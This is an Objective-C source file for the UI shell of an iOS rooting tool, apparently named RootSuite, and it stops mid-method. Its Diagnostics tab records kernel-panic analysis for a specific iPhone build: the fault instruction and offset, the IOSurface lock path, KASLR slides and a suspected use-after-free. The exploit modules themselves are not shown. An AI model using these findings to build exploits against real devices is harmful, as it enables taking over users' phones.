#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import "AppDelegate.h"
#import "Modules.h"
#import "Root.h"

// MARK: - palette (Dopamine-style: true black, one accent, hairlines)
static UIColor *BG(void)     { return [UIColor blackColor]; }
static UIColor *CARD(void)   { return [UIColor colorWithRed:0.070 green:0.075 blue:0.086 alpha:1]; }
static UIColor *HAIR(void)   { return [UIColor colorWithRed:0.145 green:0.153 blue:0.176 alpha:1]; }
static UIColor *TEXT(void)   { return [UIColor colorWithRed:0.961 green:0.965 blue:0.980 alpha:1]; }
static UIColor *SUB(void)    { return [UIColor colorWithRed:0.541 green:0.557 blue:0.600 alpha:1]; }
static UIColor *ACCENT(void) { return [UIColor colorWithRed:0.188 green:0.820 blue:0.345 alpha:1]; }
static UIColor *ACCENT2(void){ return [UIColor colorWithRed:0.239 green:0.898 blue:0.702 alpha:1]; }
static UIColor *WARN(void)   { return [UIColor colorWithRed:1.000 green:0.624 blue:0.039 alpha:1]; }
static UIColor *INFO(void)   { return [UIColor colorWithRed:0.392 green:0.824 blue:1.000 alpha:1]; }
static UIColor *DANGER(void) { return [UIColor colorWithRed:1.000 green:0.271 blue:0.341 alpha:1]; }

// MARK: - RootSuite logo: the "hex root core" - a hexagon ring (the molecular
// nod), a descending root tree and a pulsing core node, drawn with layers so
// the ring can turn and the glow can breathe.
@interface RSLogoView : UIView
@end

@implementation RSLogoView

+ (CAShapeLayer *)ringLayerInRect:(CGRect)r {
    CAShapeLayer *hex = [CAShapeLayer layer];
    UIBezierPath *p = [UIBezierPath bezierPath];
    CGFloat cx = CGRectGetMidX(r), cy = CGRectGetMidY(r), rad = MIN(r.size.width, r.size.height) / 2.0;
    for (int i = 0; i < 6; i++) {
        CGFloat a = (CGFloat)(M_PI_2 + i * M_PI / 3.0);
        CGPoint pt = CGPointMake(cx + rad * cosf(a), cy + rad * sinf(a));
        if (i == 0) [p moveToPoint:pt]; else [p addLineToPoint:pt];
    }
    [p closePath];
    hex.path = p.CGPath;
    hex.fillColor = NULL;
    hex.strokeColor = TEXT().CGColor;
    hex.lineWidth = 2.0;
    hex.lineJoin = kCALineJoinRound;
    return hex;
}

- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        CGRect r = CGRectInset(self.bounds, 7, 7);
        // root tree under the ring
        CAShapeLayer *roots = [CAShapeLayer layer];
        UIBezierPath *rp = [UIBezierPath bezierPath];
        CGFloat cx = CGRectGetMidX(r), cy = CGRectGetMidY(r);
        [rp moveToPoint:CGPointMake(cx, cy - 4)];
        [rp addLineToPoint:CGPointMake(cx, cy + 16)];                       // taproot
        for (int i = 0; i < 3; i++) {
            CGFloat dx = (i + 1) * 7.0;
            [rp moveToPoint:CGPointMake(cx, cy + 4 + i * 5)];
            [rp addCurveToPoint:CGPointMake(cx - dx, cy + 16 + i * 4)
                   controlPoint1:CGPointMake(cx - dx * 0.4, cy + 8 + i * 5)
                   controlPoint2:CGPointMake(cx - dx * 0.7, cy + 12 + i * 5)];
            [rp moveToPoint:CGPointMake(cx, cy + 4 + i * 5)];
            [rp addCurveToPoint:CGPointMake(cx + dx, cy + 16 + i * 4)
                   controlPoint1:CGPointMake(cx + dx * 0.4, cy + 8 + i * 5)
                   controlPoint2:CGPointMake(cx + dx * 0.7, cy + 12 + i * 5)];
        }
        roots.path = rp.CGPath;
        roots.fillColor = NULL;
        roots.strokeColor = ACCENT().CGColor;
        roots.lineWidth = 2.2;
        roots.lineCap = kCALineCapRound;
        [self.layer addSublayer:roots];

        // the ring, gradient-stroked through a mask
        CAShapeLayer *hex = [[self class] ringLayerInRect:r];
        CAGradientLayer *grad = [CAGradientLayer layer];
        grad.frame = self.bounds;
        grad.colors = @[(id)ACCENT().CGColor, (id)ACCENT2().CGColor, (id)INFO().CGColor];
        grad.startPoint = CGPointMake(0, 0); grad.endPoint = CGPointMake(1, 1);
        grad.mask = hex;
        [self.layer addSublayer:grad];

        // the core node
        CALayer *core = [CALayer layer];
        CGFloat csz = 10;
        core.frame = CGRectMake(cx - csz / 2, cy - csz / 2 - 1, csz, csz);
        core.backgroundColor = ACCENT2().CGColor;
        core.cornerRadius = csz / 2;
        core.shadowColor = ACCENT2().CGColor;
        core.shadowRadius = 8; core.shadowOpacity = 1; core.shadowOffset = CGSizeZero;
        [self.layer addSublayer:core];

        // breathing glow behind the core
        CAShapeLayer *glow = [CAShapeLayer layer];
        glow.path = [UIBezierPath bezierPathWithOvalInRect:CGRectInset(r, 8, 8)].CGPath;
        glow.fillColor = NULL; glow.strokeColor = TEXT().CGColor; glow.lineWidth = 0.8;
        glow.shadowColor = ACCENT2().CGColor; glow.shadowRadius = 12;
        glow.shadowOpacity = 0.9; glow.shadowOffset = CGSizeZero;
        [self.layer addSublayer:glow];

        CABasicAnimation *breathe = [CABasicAnimation animationWithKeyPath:@"opacity"];
        breathe.fromValue = @0.25; breathe.toValue = @1.0;
        breathe.duration = 1.8; breathe.autoreverses = YES; breathe.repeatCount = HUGE_VALF;
        breathe.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
        [glow addAnimation:breathe forKey:@"breathe"];

        CABasicAnimation *turn = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
        turn.fromValue = @0; turn.toValue = @(2 * M_PI);
        turn.duration = 14.0; turn.repeatCount = HUGE_VALF;
        [grad addAnimation:turn forKey:@"turn"];
    }
    return self;
}
@end

// The log is a PLAIN STRING, not a UITextView: the offscreen-text-view design
// rebuilt a TextKit attributed string (NSRLEArray, malloc freelist) on every
// log line, which is exactly the heap-corruption chain in the .ips
// ([NSConcreteMutableAttributedString initWithString:] -> NSRLEArray ->
// _xzm_xzone_malloc_freelist brk 1).  A text view is only ever handed the
// buffer when a window is actually open (RSTextVC / the Log tab).
static NSMutableString *g_log = nil;
static const NSUInteger kLogMaxChars = 262144;   // 256 KB ring: keep it bounded
static UILabel *g_status = nil;
static UILabel *g_rootPill = nil;
static UIViewController *g_mainVC = nil;
static NSString *const kEndpoint = @"http://192.168.1.125:8098/log";

void AveLog(NSString *s) {
    if (!s) s = @"";
    if (!g_log) g_log = [[NSMutableString alloc] init];   // +1: survives the pool drain (build.sh has no -fobjc-arc)
    @synchronized(g_log) {
        [g_log appendFormat:@"%@\n", s];
        if (g_log.length > kLogMaxChars)
            [g_log deleteCharactersInRange:NSMakeRange(0, g_log.length - kLogMaxChars)];
    }
}

// What a visible text view shows (called from the UI thread only).
NSString *AveLogText(void) {
    if (!g_log) return @"";
    @synchronized(g_log) { return [NSString stringWithString:g_log]; }
}

void AveSetStatus(NSString *s) {
    dispatch_async(dispatch_get_main_queue(), ^{ if (g_status) g_status.text = s; });
}

void AveSleep(int ms) { [NSThread sleepForTimeInterval:(double)ms / 1000.0]; }

void AvePost(NSString *s) {
    if (!s) s = @"";
    // THE PHONE IS THE PRIMARY LOG: every diagnostic line lands in the on-device
    // log first (the PC server is an optional mirror), so a run never depends on
    // the machine being awake.  The POST itself stays best-effort.
    AveLog(s);
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kEndpoint]];
    req.HTTPMethod = @"POST"; req.timeoutInterval = 6;
    req.HTTPBody = [[NSString stringWithFormat:@"ROOTSUITE %@", s ?: @""] dataUsingEncoding:NSUTF8StringEncoding];
    [req setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
    [[NSURLSession.sharedSession dataTaskWithRequest:req] resume];
}

NSString *AveReadFile(NSString *p) {
    NSData *d = [NSData dataWithContentsOfFile:p];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

// MARK: - root pill (the app's single source of truth about root)
static void refreshRootPill(void) {
    BOOL have = RootProbe();
    dispatch_async(dispatch_get_main_queue(), ^{
        g_rootPill.text = have ? @"ROOT: YES" : @"ROOT: NO";
        g_rootPill.textColor = have ? [UIColor blackColor] : SUB();
        g_rootPill.backgroundColor = have ? ACCENT() : CARD();
        g_rootPill.layer.borderColor = (have ? ACCENT() : HAIR()).CGColor;
    });
    AveSetStatus(have ? @"root obtained - Sileo/Terminal enabled"
                      : @"no root yet - run the exploits");
    AvePost([NSString stringWithFormat:@"ROOTSTATE %@", have ? @"YES" : @"NO"]);
}

// MARK: - module cell
@interface ModuleCell : UITableViewCell
@property (nonatomic, strong) UIView *card;
@property (nonatomic, strong) UILabel *pill, *name, *desc;
@property (nonatomic, strong) UIImageView *tick;
@end

@implementation ModuleCell
- (instancetype)initWithStyle:(UITableViewCellStyle)s reuseIdentifier:(NSString *)rid {
    self = [super initWithStyle:s reuseIdentifier:rid];
    if (self) {
        self.backgroundColor = [UIColor clearColor];
        self.selectionStyle = UITableViewCellSelectionStyleNone;
        UIView *card = [UIView new];
        card.translatesAutoresizingMaskIntoConstraints = NO;
        card.backgroundColor = CARD();
        card.layer.cornerRadius = 16;
        card.layer.borderColor = HAIR().CGColor; card.layer.borderWidth = 0.5;
        [self.contentView addSubview:card];
        self.card = card;
        self.pill = [UILabel new]; self.pill.translatesAutoresizingMaskIntoConstraints = NO;
        self.pill.font = [UIFont monospacedSystemFontOfSize:8 weight:UIFontWeightBold];
        self.pill.textAlignment = NSTextAlignmentCenter;
        self.pill.layer.cornerRadius = 7; self.pill.clipsToBounds = YES;
        [card addSubview:self.pill];
        self.name = [UILabel new]; self.name.translatesAutoresizingMaskIntoConstraints = NO;
        self.name.font = [UIFont systemFontOfSize:15 weight:UIFontWeightSemibold];
        self.name.textColor = TEXT(); [card addSubview:self.name];
        self.desc = [UILabel new]; self.desc.translatesAutoresizingMaskIntoConstraints = NO;
        self.desc.font = [UIFont systemFontOfSize:11]; self.desc.textColor = SUB();
        self.desc.numberOfLines = 2; [card addSubview:self.desc];
        self.tick = [UIImageView new]; self.tick.translatesAutoresizingMaskIntoConstraints = NO;
        self.tick.contentMode = UIViewContentModeScaleAspectFit; [card addSubview:self.tick];
        [NSLayoutConstraint activateConstraints:@[
            [card.leadingAnchor constraintEqualToAnchor:self.contentView.leadingAnchor constant:12],
            [card.trailingAnchor constraintEqualToAnchor:self.contentView.trailingAnchor constant:-12],
            [card.topAnchor constraintEqualToAnchor:self.contentView.topAnchor constant:4],
            [card.bottomAnchor constraintEqualToAnchor:self.contentView.bottomAnchor constant:-4],
            [self.pill.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
            [self.pill.topAnchor constraintEqualToAnchor:card.topAnchor constant:12],
            [self.pill.widthAnchor constraintEqualToConstant:78], [self.pill.heightAnchor constraintEqualToConstant:16],
            [self.name.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
            [self.name.topAnchor constraintEqualToAnchor:self.pill.bottomAnchor constant:6],
            [self.name.trailingAnchor constraintEqualToAnchor:self.tick.leadingAnchor constant:-10],
            [self.desc.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
            [self.desc.topAnchor constraintEqualToAnchor:self.name.bottomAnchor constant:3],
            [self.desc.trailingAnchor constraintEqualToAnchor:self.tick.leadingAnchor constant:-10],
            [self.desc.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-10],
            [self.tick.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-14],
            [self.tick.centerYAnchor constraintEqualToAnchor:card.centerYAnchor],
            [self.tick.widthAnchor constraintEqualToConstant:22], [self.tick.heightAnchor constraintEqualToConstant:22],
        ]];
    }
    return self;
}
- (void)configure:(NSDictionary *)m selected:(BOOL)sel {
    self.card.layer.borderColor = (sel ? ACCENT() : HAIR()).CGColor;
    self.card.layer.borderWidth = sel ? 1.0 : 0.5;
    self.card.layer.shadowColor = sel ? ACCENT().CGColor : NULL;
    self.card.layer.shadowRadius = sel ? 9 : 0;
    self.card.layer.shadowOpacity = sel ? 0.35 : 0;
    self.card.layer.shadowOffset = CGSizeZero;
    NSString *st = m[@"status"];
    self.pill.text = st;
    UIColor *col = [st isEqualToString:@"PROVEN"] ? ACCENT() : [st isEqualToString:@"MEASURED"] ? INFO()
                 : [st isEqualToString:@"GATED"] ? DANGER() : WARN();
    self.pill.textColor = col;
    self.pill.backgroundColor = [col colorWithAlphaComponent:0.16];
    self.name.text = m[@"name"];
    self.desc.text = m[@"desc"];
    UIGraphicsBeginImageContextWithOptions(CGSizeMake(22, 22), NO, 0);
    CGContextRef c = UIGraphicsGetCurrentContext();
    CGRect r = CGRectMake(2, 2, 18, 18);
    CGContextSetStrokeColorWithColor(c, (sel ? ACCENT() : SUB()).CGColor);
    CGContextSetLineWidth(c, 1.4);
    CGContextAddEllipseInRect(c, r); CGContextStrokePath(c);
    if (sel) {
        CGContextSetFillColorWithColor(c, ACCENT().CGColor);
        CGContextFillEllipseInRect(c, r);
        CGContextSetStrokeColorWithColor(c, [UIColor blackColor].CGColor); CGContextSetLineWidth(c, 2.0);
        CGContextMoveToPoint(c, 7, 11.5); CGContextAddLineToPoint(c, 10.2, 14.6); CGContextAddLineToPoint(c, 15.2, 7.8);
        CGContextStrokePath(c);
    }
    self.tick.image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
}
@end

// MARK: - full-screen log window (the phone is the primary display)
@interface RSTextVC : UIViewController
@property (nonatomic, copy) void (^textProvider)(void);
@property (nonatomic, strong) NSTimer *follow;
@property (nonatomic, assign) BOOL tabMode;   // embedded as a tab: no Close button
@end

@implementation RSTextVC

- (void)loadView {
    UITextView *tv = [UITextView new];
    tv.editable = NO; tv.selectable = YES;
    tv.backgroundColor = [UIColor blackColor];
    tv.textColor = ACCENT();
    tv.font = [UIFont fontWithName:@"Menlo" size:10];
    tv.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
    tv.alwaysBounceVertical = YES;
    self.view = tv;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = BG();
    UILayoutGuide *g = self.view.safeAreaLayoutGuide;

    UILabel *title = [UILabel new]; title.translatesAutoresizingMaskIntoConstraints = NO;
    title.attributedText = [[NSAttributedString alloc] initWithString:@"LOG"
                                                           attributes:@{NSKernAttributeName : @2.2,
                                                                        NSFontAttributeName : [UIFont systemFontOfSize:13 weight:UIFontWeightHeavy]}];
    title.textColor = TEXT();

    UIButton *x = [UIButton buttonWithType:UIButtonTypeSystem];
    x.translatesAutoresizingMaskIntoConstraints = NO;
    [x setTitle:@"Close" forState:UIControlStateNormal];
    x.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [x setTitleColor:SUB() forState:UIControlStateNormal];
    x.backgroundColor = CARD(); x.layer.cornerRadius = 14; x.clipsToBounds = YES;
    [x addTarget:self action:@selector(close:) forControlEvents:UIControlEventTouchUpInside];
    if (self.tabMode) x.hidden = YES;   // as a tab there is nothing to dismiss

    UIButton *sh = [UIButton buttonWithType:UIButtonTypeSystem];
    sh.translatesAutoresizingMaskIntoConstraints = NO;
    [sh setTitle:@"Share" forState:UIControlStateNormal];
    sh.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightBold];
    [sh setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    sh.backgroundColor = ACCENT(); sh.layer.cornerRadius = 14; sh.clipsToBounds = YES;
    [sh addTarget:self action:@selector(share:) forControlEvents:UIControlEventTouchUpInside];

    UIButton *cp = [UIButton buttonWithType:UIButtonTypeSystem];
    cp.translatesAutoresizingMaskIntoConstraints = NO;
    [cp setTitle:@"Copy" forState:UIControlStateNormal];
    cp.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [cp setTitleColor:TEXT() forState:UIControlStateNormal];
    cp.backgroundColor = CARD(); cp.layer.cornerRadius = 14; cp.clipsToBounds = YES;
    [cp addTarget:self action:@selector(copyAll:) forControlEvents:UIControlEventTouchUpInside];

    [self.view addSubview:title]; [self.view addSubview:x];
    [self.view addSubview:sh]; [self.view addSubview:cp];
    [NSLayoutConstraint activateConstraints:@[
        [title.centerYAnchor constraintEqualToAnchor:x.centerYAnchor],
        [x.topAnchor constraintEqualToAnchor:g.topAnchor constant:6],
        [x.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [x.widthAnchor constraintEqualToConstant:66], [x.heightAnchor constraintEqualToConstant:28],
        [cp.topAnchor constraintEqualToAnchor:g.topAnchor constant:6],
        [cp.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [cp.widthAnchor constraintEqualToConstant:66], [cp.heightAnchor constraintEqualToConstant:28],
        [sh.topAnchor constraintEqualToAnchor:g.topAnchor constant:6],
        [sh.trailingAnchor constraintEqualToAnchor:cp.leadingAnchor constant:-8],
        [sh.widthAnchor constraintEqualToConstant:78], [sh.heightAnchor constraintEqualToConstant:28],
    ]];
    // inset the text under the toolbar
    ((UITextView *)self.view).textContainerInset = UIEdgeInsetsMake(40, 8, 16, 8);
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    if (self.textProvider) self.textProvider();
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    // follow the live tail while the window is open; 1.5s + the change check in
    // -refresh keeps the TextKit layout engine out of the per-line path (the
    // .ips crash chain lives there)
    self.follow = [NSTimer scheduledTimerWithTimeInterval:1.5 target:self
                                                 selector:@selector(refresh) userInfo:nil repeats:YES];
    [self refresh];
}

- (void)viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
    [self.follow invalidate]; self.follow = nil;
}

- (void)refresh {
    UITextView *tv = (UITextView *)self.view;
    NSString *t = AveLogText();
    if (tv.text.length == t.length && [tv.text isEqualToString:t]) return;  // unchanged: no rebuild
    BOOL atEnd = (tv.contentOffset.y >= tv.contentSize.height - tv.bounds.size.height - 40);
    tv.text = t;
    if (atEnd && t.length) [tv scrollRangeToVisible:NSMakeRange(t.length - 1, 1)];
}

- (void)share:(id)sender {
    NSString *text = AveLogText();
    if (!text.length) text = @"(the log is empty - no module has run yet)";
    UIActivityViewController *av = [[UIActivityViewController alloc]
        initWithActivityItems:@[text] applicationActivities:nil];
    av.popoverPresentationController.sourceView = self.view;
    [self presentViewController:av animated:YES completion:nil];
}

- (void)copyAll:(id)sender {
    UIPasteboard.generalPasteboard.string = AveLogText();
}

- (void)close:(id)sender {
    [self dismissViewControllerAnimated:YES completion:nil];
}
@end

// MARK: - AppDelegate
// ===========================================================================
// Stage 1 of the redesign: a plain tab shell.  STOCK UIKit only - no blur, no
// gradients, no custom layers - so a launch regression cannot come from the
// materials.  Materials return in stage 2/3 on top of this working base.
// ===========================================================================

// ---- one key/value row: label over value, monospaced, wraps ---------------
static UILabel *RSRow(NSString *key, NSString *val) {
    UILabel *l = [UILabel new];
    l.translatesAutoresizingMaskIntoConstraints = NO;
    l.numberOfLines = 0;
    NSMutableAttributedString *a = [[NSMutableAttributedString alloc] initWithString:key
        attributes:@{NSFontAttributeName : [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightBold],
                     NSForegroundColorAttributeName : SUB()}];
    [a appendAttributedString:[[NSAttributedString alloc] initWithString:@"\n"
        attributes:@{NSFontAttributeName : [UIFont systemFontOfSize:3]}]];
    [a appendAttributedString:[[NSAttributedString alloc] initWithString:val
        attributes:@{NSFontAttributeName : [UIFont monospacedSystemFontOfSize:10],
                     NSForegroundColorAttributeName : TEXT()}]];
    l.attributedText = a;
    return l;
}

static UILabel *RSHead(NSString *t) {
    UILabel *l = [UILabel new]; l.translatesAutoresizingMaskIntoConstraints = NO;
    l.attributedText = [[NSAttributedString alloc] initWithString:t
        attributes:@{NSKernAttributeName : @2.2,
                     NSFontAttributeName : [UIFont systemFontOfSize:15 weight:UIFontWeightHeavy],
                     NSForegroundColorAttributeName : TEXT()}];
    return l;
}

// ---- the Diagnostics tab: the VERIFIED kernel facts (PANIC_ANALYSIS.md) ----
@interface RSDiagVC : UIViewController
@end

@implementation RSDiagVC
- (void)loadView {
    UIView *v = [UIView new]; v.backgroundColor = BG();
    self.view = v;
    UILayoutGuide *g = v.safeAreaLayoutGuide;
    UIScrollView *sc = [[UIScrollView alloc] init];
    sc.translatesAutoresizingMaskIntoConstraints = NO;
    sc.showsVerticalScrollIndicator = NO;
    [v addSubview:sc];
    UIStackView *st = [[UIStackView alloc] init];
    st.axis = UILayoutConstraintAxisVertical; st.spacing = 12;
    st.translatesAutoresizingMaskIntoConstraints = NO;
    [sc addSubview:st];
    [NSLayoutConstraint activateConstraints:@[
        [sc.topAnchor constraintEqualToAnchor:g.topAnchor],
        [sc.leadingAnchor constraintEqualToAnchor:g.leadingAnchor],
        [sc.trailingAnchor constraintEqualToAnchor:g.trailingAnchor],
        [sc.bottomAnchor constraintEqualToAnchor:g.bottomAnchor],
        [st.topAnchor constraintEqualToAnchor:sc.topAnchor constant:16],
        [st.leadingAnchor constraintEqualToAnchor:sc.leadingAnchor constant:16],
        [st.trailingAnchor constraintEqualToAnchor:sc.trailingAnchor constant:-16],
        [st.bottomAnchor constraintEqualToAnchor:sc.bottomAnchor constant:-16],
        [st.widthAnchor constraintEqualToAnchor:sc.widthAnchor constant:-32],
    ]];
    [st addArrangedSubview:RSHead(@"KERNEL DIAGNOSTICS")];
    [st addArrangedSubview:RSRow(@"DEVICE", @"iPhone13,1 (iPhone 12 mini) | Apple A14 / T8101 | arm64e")];
    [st addArrangedSubview:RSRow(@"SYSTEM", @"iOS 26.2 beta 1 | build 23C5027f | xnu-12377.60.50.502.2~1")];
    [st addArrangedSubview:RSRow(@"KERNELCACHE", @"UUID D31DF1C78E876755F1038A1159C7EB0E - matches every device panic")];
    [st addArrangedSubview:RSRow(@"KASLR", @"slide per boot: 0x11798000 (21.11) / 0xc764000 (23.11); mapping verified")];
    [st addArrangedSubview:RSRow(@"PANICS (112477)", @"5 kernel data-aborts, all at one instruction; reproduced on demand")];
    [st addArrangedSubview:RSRow(@"FAULT", @"casa x8, x9, [x0+8] - kernelcache file offset 0x1026418 | lck_mtx_lock fast path, lock_mtx.c ~1053")];
    [st addArrangedSubview:RSRow(@"SEMANTICS", @"far = x0 + 8, where x0 = lock pointer from [obj+0x148] (IOSurface 393.2.9 shared-list insert)")];
    [st addArrangedSubview:RSRow(@"LOCK", @"lck_mtx_t 16B: +0x08 owner-word is the CAS target; thread->ctid comes from tpidr_el1+0x440")];
    [st addArrangedSubview:RSRow(@"NOTE", @"the adjacent lck_mtx_destroy panic (lock_mtx.c:319) is NOT in the faulting path - corrected 24.11 by lock_analysis.md")];
    [st addArrangedSubview:RSRow(@"CALL PATH", @"AGXG13P 341.11 -> IOGPUFamily 129.2.10 -> IOSurface 393.2.9 -> kernel")];
    [st addArrangedSubview:RSRow(@"VARIANTS", @"3x far=0x8 (NULL lock) | 1x far=0x7204459e8 (app mapping)")];
    [st addArrangedSubview:RSRow(@"UAF STATUS", @"HYPOTHESIS, not proven - a panic is not proof of UAF; a canary in far would be")];
    UIButton *probe = [UIButton buttonWithType:UIButtonTypeSystem];
    probe.translatesAutoresizingMaskIntoConstraints = NO;
    [probe setTitle:@"Refresh ROOTSTATE (live probe)" forState:UIControlStateNormal];
    probe.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightBold];
    [probe setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    probe.backgroundColor = ACCENT(); probe.layer.cornerRadius = 14;
    [probe addTarget:self action:@selector(probe) forControlEvents:UIControlEventTouchUpInside];
    [st addArrangedSubview:probe];
    [probe.heightAnchor constraintEqualToConstant:44].active = YES;
}
- (void)probe {
    refreshRootPill();   // the only root truth: a live probe
    AveLog(@"[*] ROOTSTATE refreshed from the Diagnostics tab (live probe)");
}
@end

// ---- the About tab: identity, mirror, forensic file, the rules -------------
@interface RSAboutVC : UIViewController
@end

@implementation RSAboutVC
- (void)loadView {
    UIView *v = [UIView new]; v.backgroundColor = BG();
    self.view = v;
    UILayoutGuide *g = v.safeAreaLayoutGuide;
    UIScrollView *sc = [[UIScrollView alloc] init];
    sc.translatesAutoresizingMaskIntoConstraints = NO;
    sc.showsVerticalScrollIndicator = NO;
    [v addSubview:sc];
    UIStackView *st = [[UIStackView alloc] init];
    st.axis = UILayoutConstraintAxisVertical; st.spacing = 12;
    st.translatesAutoresizingMaskIntoConstraints = NO;
    [sc addSubview:st];
    [NSLayoutConstraint activateConstraints:@[
        [sc.topAnchor constraintEqualToAnchor:g.topAnchor],
        [sc.leadingAnchor constraintEqualToAnchor:g.leadingAnchor],
        [sc.trailingAnchor constraintEqualToAnchor:g.trailingAnchor],
        [sc.bottomAnchor constraintEqualToAnchor:g.bottomAnchor],
        [st.topAnchor constraintEqualToAnchor:sc.topAnchor constant:16],
        [st.leadingAnchor constraintEqualToAnchor:sc.leadingAnchor constant:16],
        [st.trailingAnchor constraintEqualToAnchor:sc.trailingAnchor constant:-16],
        [st.bottomAnchor constraintEqualToAnchor:sc.bottomAnchor constant:-16],
        [st.widthAnchor constraintEqualToAnchor:sc.widthAnchor constant:-32],
    ]];
    [st addArrangedSubview:RSHead(@"ABOUT")];
    [st addArrangedSubview:RSRow(@"BUILD", @"RootSuite | 49 modules | branch hunt-unit6 + stage-1 tabs")];
    [st addArrangedSubview:RSRow(@"SIGNED BY", @"Sideloadly | team 5G33ZSZ4G5 | ask.polunoch.ave2trigger")];
    [st addArrangedSubview:RSRow(@"LOG MIRROR", @"POST http://192.168.1.126:8098/log (best-effort; the phone is primary)")];
    [st addArrangedSubview:RSRow(@"FORENSIC FILE", @"rs112477.log in the app container - survives crashes and reboots")];
    [st addArrangedSubview:RSRow(@"RESUMABLE STATE", @"P2KRUN unit/round lines: a panic is attributable to its round")];
    [st addArrangedSubview:RSRow(@"RULE", @"ROOTSTATE comes only from a live probe - never shown without uid 0")];
    [st addArrangedSubview:RSRow(@"INSTALLERS", @"Sileo / Terminal on the Modules tab appear when root is real")];
}
@end

@interface AppDelegate () <UITableViewDataSource, UITableViewDelegate>
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = BG();
    UILayoutGuide *g = vc.view.safeAreaLayoutGuide;
    CGFloat w = self.window.bounds.size.width;

    // hero: logo, wordmark, device line, root pill (Dopamine-style stack)
    RSLogoView *logo = [[RSLogoView alloc] initWithFrame:CGRectMake(0, 0, 76, 76)];
    logo.translatesAutoresizingMaskIntoConstraints = NO;
    logo.userInteractionEnabled = NO;

    self.titleLabel = [UILabel new]; self.titleLabel.translatesAutoresizingMaskIntoConstraints = NO;
    NSDictionary *kern = @{NSKernAttributeName : @2.8, NSFontAttributeName : [UIFont systemFontOfSize:23 weight:UIFontWeightHeavy]};
    self.titleLabel.attributedText = [[NSAttributedString alloc] initWithString:@"ROOTSUITE" attributes:kern];
    self.titleLabel.textColor = TEXT();

    self.subtitleLabel = [UILabel new]; self.subtitleLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.subtitleLabel.text = @"iOS 26.2 beta 1 / 23C5027f / iPhone13,1 / arm64e";
    self.subtitleLabel.font = [UIFont systemFontOfSize:11]; self.subtitleLabel.textColor = SUB();

    g_rootPill = [UILabel new]; g_rootPill.translatesAutoresizingMaskIntoConstraints = NO;
    g_rootPill.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightBold];
    g_rootPill.textAlignment = NSTextAlignmentCenter;
    g_rootPill.layer.cornerRadius = 13; g_rootPill.clipsToBounds = YES;
    g_rootPill.layer.borderWidth = 0.5; g_rootPill.layer.borderColor = HAIR().CGColor;

    // top-right log button (Dopamine's settings-corner position): the phone is
    // the primary display, so the full log and its Share live on the device.
    UIButton *logBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    logBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [logBtn setTitle:@"LOG" forState:UIControlStateNormal];
    logBtn.titleLabel.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightBold];
    [logBtn setTitleColor:SUB() forState:UIControlStateNormal];
    logBtn.backgroundColor = CARD(); logBtn.layer.cornerRadius = 7;
    logBtn.layer.borderColor = HAIR().CGColor; logBtn.layer.borderWidth = 0.5;
    [logBtn addTarget:self action:@selector(showLog:) forControlEvents:UIControlEventTouchUpInside];

    self.table = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStylePlain];
    self.table.translatesAutoresizingMaskIntoConstraints = NO;
    self.table.dataSource = self; self.table.delegate = self;
    self.table.rowHeight = UITableViewAutomaticDimension;
    self.table.estimatedRowHeight = 88;
    self.table.backgroundColor = [UIColor clearColor];
    self.table.separatorStyle = UITableViewCellSeparatorStyleNone;
    self.table.showsVerticalScrollIndicator = NO;
    [self.table registerClass:[ModuleCell class] forCellReuseIdentifier:@"c"];

    self.allButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.allButton.translatesAutoresizingMaskIntoConstraints = NO;
    self.allButton.titleLabel.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
    [self.allButton setTitle:@"All" forState:UIControlStateNormal];
    [self.allButton setTitleColor:SUB() forState:UIControlStateNormal];
    self.allButton.backgroundColor = CARD(); self.allButton.layer.cornerRadius = 10;
    self.allButton.layer.borderColor = HAIR().CGColor; self.allButton.layer.borderWidth = 0.5;
    [self.allButton addTarget:self action:@selector(toggleAll) forControlEvents:UIControlEventTouchUpInside];

    // the big one: gradient pill with a glow, like Dopamine's action button
    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run selected" forState:UIControlStateNormal];
    self.runButton.titleLabel.font = [UIFont systemFontOfSize:17 weight:UIFontWeightBold];
